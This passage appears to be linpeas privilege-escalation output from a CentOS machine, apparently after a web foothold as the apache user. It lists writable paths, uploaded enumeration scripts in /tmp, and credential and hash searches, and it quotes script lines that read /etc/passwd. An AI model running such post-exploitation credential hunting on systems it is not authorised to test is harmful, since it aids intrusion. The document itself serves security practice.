+-rw-r--r--. 1 root root 0 Jul  2  2019 /var/cache/yum/x86_64/7/.gpgkeyschecked.yum
+-rw-r--r--. 1 root root 163 Jul  2  2019 /var/.updated
+-rw-r--r--. 1 root root 65 Mar 12  2019 /usr/lib64/.libcrypto.so.1.0.2k.hmac
+-rw-r--r--. 1 root root 65 Mar 12  2019 /usr/lib64/.libssl.so.1.0.2k.hmac
+-rw-r--r--. 1 root root 65 Aug  2  2017 /usr/lib64/.libgcrypt.so.11.hmac
+-rw-r--r--. 1 root root 40 Oct 30  2018 /usr/share/man/man1/..1.gz
+-rw-r--r--. 1 root root 42 Jan 29  2019 /usr/share/man/man5/.k5identity.5.gz
+-rw-r--r--. 1 root root 39 Jan 29  2019 /usr/share/man/man5/.k5login.5.gz
+-rw-r--r--. 1 root root 2328 Apr 23  2013 /usr/share/kde4/apps/kdm/themes/CentOS7/.colorlsCZ1
+-rw-r--r--. 1 guly guly 18 Oct 30  2018 /home/guly/.bash_logout
+-rw-r--r--. 1 guly guly 193 Oct 30  2018 /home/guly/.bash_profile
+-rw------- 1 guly guly 639 Jul  9  2019 /home/guly/.viminfo
+
+[+] Readable files inside /tmp, /var/tmp, /var/backups(limit 70)
+-rwxr-xr-x 1 apache apache 34374 Aug  9 15:07 /tmp/lse.sh
+-rwxr-xr-x 1 apache apache 159864 Aug  9 15:07 /tmp/linpeas.sh
+-rw-r--r-- 1 apache apache 3736 Nov 25  2018 /var/tmp/yum-apache-orEfG7/x86_64/7/base/repomd.xml
+-rw-r--r-- 1 apache apache 0 Jul  8  2019 /var/tmp/yum-apache-orEfG7/x86_64/7/base/cachecookie
+-rw-r--r-- 1 apache apache 545 Jul  8  2019 /var/tmp/yum-apache-orEfG7/x86_64/7/base/mirrorlist.txt
+-rw-r--r-- 1 apache apache 3445 Jun 19  2019 /var/tmp/yum-apache-orEfG7/x86_64/7/extras/repomd.xml
+-rw-r--r-- 1 apache apache 0 Jul  8  2019 /var/tmp/yum-apache-orEfG7/x86_64/7/extras/cachecookie
+-rw-r--r-- 1 apache apache 586 Jul  8  2019 /var/tmp/yum-apache-orEfG7/x86_64/7/extras/mirrorlist.txt
+-rw-r--r-- 1 apache apache 3461 Jul  3  2019 /var/tmp/yum-apache-orEfG7/x86_64/7/updates/repomd.xml
+-rw-r--r-- 1 apache apache 0 Jul  8  2019 /var/tmp/yum-apache-orEfG7/x86_64/7/updates/cachecookie
+-rw-r--r-- 1 apache apache 596 Jul  8  2019 /var/tmp/yum-apache-orEfG7/x86_64/7/updates/mirrorlist.txt
+
+[+] Interesting writable files owned by me or writable by everyone (not in Home)
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
+/dev/mqueue
+/dev/shm
+/home/guly
+/home/guly/.bash_logout
+/home/guly/.bash_profile
+/home/guly/.bashrc
+/home/guly/.viminfo
+/home/guly/user.txt
+/tmp
+/var/spool/mail/guly
+/var/tmp
+/var/www/html/uploads
+
+[+] Interesting GROUP writable files (not in Home)
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
+  Group apache:
+/var/lib/php/session
+
+[+] Searching passwords in config PHP files
+
+[+] Finding IPs inside logs (limit 70)
+      2 /var/log/vmware-vmsvc.log:10.2.5.36
+
+[+] Finding passwords inside logs (limit 70)
+
+[+] Finding emails inside logs (limit 70)
+      1 /var/log/dmesg:tsbogend@alpha.franken.de
+      1 /var/log/dmesg:mockbuild@kbuilder.bsys.centos.org
+      1 /var/log/dmesg:dm-devel@redhat.com
+      1 /var/log/dmesg.old:tsbogend@alpha.franken.de
+      1 /var/log/dmesg.old:mockbuild@kbuilder.bsys.centos.org
+      1 /var/log/dmesg.old:dm-devel@redhat.com
+
+[+] Finding *password* or *credential* files in home (limit 70)
+
+[+] Finding 'pwd' or 'passw' variables inside /home /var/www /var/backups /tmp /etc /root /mnt (limit 70)
+/etc/nsswitch.conf.bak:passwd:     files sss
+/etc/nsswitch.conf:passwd:     files sss
+/etc/php.ini:; Define the anonymous ftp password (your email address). PHP's default setting
+/etc/security/namespace.init:                gid=$(echo "$passwd" | cut -f4 -d":")
+/etc/security/namespace.init:        homedir=$(echo "$passwd" | cut -f6 -d":")
+/etc/security/namespace.init:        passwd=$(getent passwd "$user")
+/etc/selinux/semanage.conf:usepasswd=False
+/etc/selinux/targeted/contexts/files/file_contexts:/bin/systemd-tty-ask-password-agent	--	system_u:object_r:systemd_passwd_agent_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/etc/\.pwd\.lock	--	system_u:object_r:passwd_file_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/etc/dovecot\.passwd.*	system_u:object_r:dovecot_passwd_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/etc/group[-\+]?	--	system_u:object_r:passwd_file_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/etc/group\.lock	--	system_u:object_r:passwd_file_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/etc/passwd[-\+]?	--	system_u:object_r:passwd_file_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/etc/passwd\.OLD	--	system_u:object_r:passwd_file_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/etc/passwd\.adjunct.*	--	system_u:object_r:passwd_file_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/etc/passwd\.lock	--	system_u:object_r:passwd_file_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/etc/ptmptmp	--	system_u:object_r:passwd_file_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/etc/rc\.d/init\.d/yppasswd	--	system_u:object_r:nis_initrc_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/etc/samba/smbpasswd	--	system_u:object_r:samba_secrets_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/etc/security/opasswd	--	system_u:object_r:shadow_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/etc/security/opasswd\.old	--	system_u:object_r:shadow_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/opt/vmware/(workstation|player)/bin/vmware-smbpasswd	--	system_u:object_r:vmware_host_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/sbin/unix_chkpwd	--	system_u:object_r:chkpwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/sbin/unix_update	--	system_u:object_r:updpwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/sbin/unix_verify	--	system_u:object_r:chkpwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/bin/chage	--	system_u:object_r:passwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/bin/gpasswd	--	system_u:object_r:groupadd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/bin/passwd	--	system_u:object_r:passwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/bin/systemd-gnome-ask-password-agent	--	system_u:object_r:systemd_passwd_agent_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/bin/systemd-tty-ask-password-agent	--	system_u:object_r:systemd_passwd_agent_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/bin/vigr	--	system_u:object_r:admin_passwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/bin/vipw	--	system_u:object_r:admin_passwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/bin/vmware-smbpasswd	--	system_u:object_r:vmware_host_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/bin/vmware-smbpasswd\.bin	--	system_u:object_r:vmware_host_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/lib/systemd/system/yppasswdd.*	--	system_u:object_r:nis_unit_file_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/libexec/httpd-ssl-pass-dialog	--	system_u:object_r:httpd_passwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/sbin/chpasswd	--	system_u:object_r:passwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/sbin/gpasswd	--	system_u:object_r:groupadd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/sbin/grpconv	--	system_u:object_r:admin_passwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/sbin/grpunconv	--	system_u:object_r:admin_passwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/sbin/pwconv	--	system_u:object_r:admin_passwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/sbin/pwhistory_helper	--	system_u:object_r:updpwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/sbin/pwunconv	--	system_u:object_r:admin_passwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/sbin/rpc\.yppasswdd	--	system_u:object_r:yppasswdd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/sbin/rpc\.yppasswdd\.env	--	system_u:object_r:yppasswdd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/sbin/unix_chkpwd	--	system_u:object_r:chkpwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/sbin/unix_update	--	system_u:object_r:updpwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/sbin/unix_verify	--	system_u:object_r:chkpwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/sbin/validate	--	system_u:object_r:chkpwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/sbin/vigr	--	system_u:object_r:admin_passwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/sbin/vipw	--	system_u:object_r:admin_passwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/var/run/systemd/ask-password(/.*)?	system_u:object_r:systemd_passwd_var_run_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/var/run/systemd/ask-password-block(/.*)?	system_u:object_r:systemd_passwd_var_run_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/var/run/yppass.*	--	system_u:object_r:yppasswdd_var_run_t:s0
+/etc/sysconfig/authconfig:PASSWDALGORITHM=sha512
+/etc/sysconfig/authconfig:USEPASSWDQC=no
+/tmp/linpeas.sh:    SHELLUSERS=`cat /etc/passwd 2>/dev/null | grep -i "sh$" | cut -d ":" -f 1`
+/tmp/lse.sh:    'for u in $(cut -d: -f 1 /etc/passwd); do [ "$u" != "$lse_user" ] && crontab -l -u "$u"; done'
+/tmp/lse.sh:    'for u in $(cut -d: -f1 /etc/passwd); do [ $(id -u $u) == 0 ] && echo $u; done | grep -v root'
+/tmp/lse.sh:[ -z "$lse_home" ] && lse_home="`(grep -E "^$lse_user:" /etc/passwd | cut -d: -f6)2>/dev/null`"
+
+[+] Finding possible password variables inside /home /var/www /var/backups /tmp /etc /root /mnt (limit 70)
+/etc/selinux/targeted/contexts/files/file_contexts.homedirs:/home/[^/]+/public_git(/.*)?	unconfined_u:object_r:git_user_content_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/lib/pgsql/test/regress(/.*)?	system_u:object_r:postgresql_db_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/share/jonas/pgsql(/.*)?	system_u:object_r:postgresql_db_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/var/lib/pgsql(/.*)?	system_u:object_r:postgresql_db_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/var/lib/postgres(ql)?(/.*)?	system_u:object_r:postgresql_db_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/var/lib/sepgsql(/.*)?	system_u:object_r:postgresql_db_t:s0
+/etc/selinux/targeted/contexts/sepgsql_contexts:db_database	*			system_u:object_r:sepgsql_db_t:s0
+
+[+] Finding 'username' string inside /home /var/www /var/backups /tmp /etc /root /mnt (limit 70)
+/etc/libuser.conf:LU_USERNAME = %n
+/tmp/linpeas.sh:    for f in $tomcat; do grep "username=" $f 2>/dev/null | grep "password=" | sed "s,.*,${C}[1;31m&${C}[0m,"; done
+/tmp/lse.sh:    'grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab'
+
+[+] Looking for specific hashes inside files - less false positives (limit 70)
+
+[+] Looking for md5/sha1/sha256/sha512 hashes inside files (limit 50)
+/etc/machine-id:e1a6ab0dceb44da38dac3494ad76813d
+/etc/selinux/targeted/.policy.sha512:b48e3282a7ff6842997ce0580cfe6309c5bd68c964c2523fa79b90b120b71c50b03038264e62ae245a189a6e9626dd27092bb630b4b80c8a39a403a5a60741ab
+/var/tmp/yum-apache-orEfG7/x86_64/7/base/repomd.xml:>aced7d22b338fdf7c0a71ffcf32614e058f4422c42476d1f4b9e9364d567702f<
+/var/tmp/yum-apache-orEfG7/x86_64/7/extras/repomd.xml:>1d606c78346294101e4cb0d261c092ae3716c0b698f3d0413a69dc7744fc1be8<
+/var/tmp/yum-apache-orEfG7/x86_64/7/updates/repomd.xml:>96d83431852cd4fe40ff3baaebc1dbdeb20b2456990b6bff9f8d002d690aae42<
